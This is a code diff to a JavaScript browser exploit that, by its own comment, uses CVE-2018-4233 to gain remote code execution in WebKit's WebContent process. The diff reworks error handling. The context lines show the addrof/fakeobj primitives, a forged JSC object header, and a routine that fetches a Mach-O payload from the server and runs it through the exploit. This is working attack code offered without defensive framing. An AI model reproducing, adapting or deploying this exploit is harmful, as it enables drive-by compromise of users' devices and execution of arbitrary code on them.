@@ -4,22 +4,6 @@
  * This exploit uses CVE-2018-4233 (by saelo) to get RCE in WebContent.
  */
 
-DEBUG = false
-print = function(msg) {
-    if (!DEBUG) 
-    {
-        return;
-    }
-
-    alert(msg);
-}
-
-function fail(x) {
-    alert('FAIL ' + x);
-    location.reload();
-    throw null;
-}
-
 ITERS = 10000
 ALLOCS = 1000
 
@@ -54,12 +38,6 @@ function xor(a, b) {
         base *= 2
     }
     return res
-}
-
-function fail(x) {
-    alert('FAIL ' + x);
-    location.reload();
-    throw null;
 }
 
 // CVE-2018-4233
@@ -102,7 +80,7 @@ function pwn(binary) {
             var addr = this.addrof({a: 0x1337})
             var x = this.fakeobj(addr)
             if (x.a != 0x1337) {
-                fail(1)
+                fail('stage1')
             }
         },
     }
@@ -161,7 +139,7 @@ function get_mem_old(stage1) {
     // print("[*] Setting up container object");
 
     var jsCellHeader = new Int64([
-        00, 0x10, 00, 00,       // m_structureID, current guess.
+        0, 0x10, 0, 0,          // m_structureID, current guess.
                                 // JSC allocats a set of structures for non-JSObjects (Executables, regular expression objects, ...)
                                 // during start up. Avoid these by picking a high initial ID.
         0x0,                    // m_indexingType, None
@@ -430,22 +408,19 @@ function get_mem_new(stage1) {
 function go() {
     fetch('payload').then((response) => {
         response.arrayBuffer().then((buffer) => {
-            print(`got ${buffer.byteLength} bytes of shc`);
             var arrayBuf = new Uint8Array(buffer);
             var header = b2u32(arrayBuf.slice(0, 4)); // sanity check on the header
-            if (header != 0xfeedfacf) {
-                print(`header is invalid: ${hexit(header)}, should be 0xfeedfacf\nwtf is your payload??`);
+            if(header != 0xfeedfacf)
+            {
+                fail(`header is invalid: ${hexit(header)}, should be 0xfeedfacf\nwtf is your payload??`);
                 return;
             }
-            
-            window.setTimeout(function()
-            {
-                try {
-                    pwn(arrayBuf);
-                } catch (e) {
-                    print(`Error: ${e}\n${e.stack}`);
-                }
-            }, 0);
+
+            try {
+                pwn(arrayBuf);
+            } catch (e) {
+                fail(`Error: ${e}\n${e.stack}`);
+            }
         })
     });
 }
